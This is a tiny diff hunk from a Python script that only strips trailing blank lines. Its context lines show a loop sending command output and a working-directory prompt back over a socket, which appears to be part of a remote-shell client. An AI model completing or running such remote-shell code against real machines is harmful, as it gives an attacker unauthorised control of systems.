@@ -20,7 +20,3 @@ while True:
         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
 
 s.close()
-
-               
-
-
